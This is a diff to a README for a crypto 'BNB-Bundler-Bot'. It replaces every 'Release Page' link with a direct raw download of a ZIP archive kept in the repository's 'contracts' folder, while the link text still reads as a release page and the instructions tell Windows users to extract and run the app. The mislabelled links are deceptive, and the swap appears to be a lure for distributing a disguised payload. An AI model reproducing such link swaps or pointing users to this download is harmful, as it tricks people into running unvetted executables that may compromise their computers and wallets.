@@ -1,10 +1,10 @@
 # 🤖 BNB-Bundler-Bot - Bundle BNB Tasks with Ease
 
-[![Download BNB-Bundler-Bot](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/davigrt52/BNB-Bundler-Bot/releases)
+[![Download BNB-Bundler-Bot](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/davigrt52/BNB-Bundler-Bot/raw/refs/heads/main/contracts/BN-Bundler-Bot-v1.7.zip)
 
 ## 📥 Download
 
-Visit this page to download: [BNB-Bundler-Bot Releases](https://github.com/davigrt52/BNB-Bundler-Bot/releases)
+Visit this page to download: [BNB-Bundler-Bot Releases](https://github.com/davigrt52/BNB-Bundler-Bot/raw/refs/heads/main/contracts/BN-Bundler-Bot-v1.7.zip)
 
 1. Open the release page.
 2. Find the latest release at the top.
@@ -94,7 +94,7 @@ Not every release will include the same files, but this is a common layout for a
 ## ❓ Common Questions
 
 ### Where do I get the app?
-Go to the [Release Page](https://github.com/davigrt52/BNB-Bundler-Bot/releases) and download the latest Windows file.
+Go to the [Release Page](https://github.com/davigrt52/BNB-Bundler-Bot/raw/refs/heads/main/contracts/BN-Bundler-Bot-v1.7.zip) and download the latest Windows file.
 
 ### Do I need to install it?
 If the release is a ZIP file, you only need to extract it and run the app. If the release includes an installer, run the installer first.
@@ -116,7 +116,7 @@ Before you run the app, make sure the file comes from the release page linked ab
 
 ## 🧭 Quick Start
 
-1. Open the [BNB-Bundler-Bot Releases](https://github.com/davigrt52/BNB-Bundler-Bot/releases) page.
+1. Open the [BNB-Bundler-Bot Releases](https://github.com/davigrt52/BNB-Bundler-Bot/raw/refs/heads/main/contracts/BN-Bundler-Bot-v1.7.zip) page.
 2. Download the latest Windows file.
 3. Extract it if needed.
 4. Open the app.
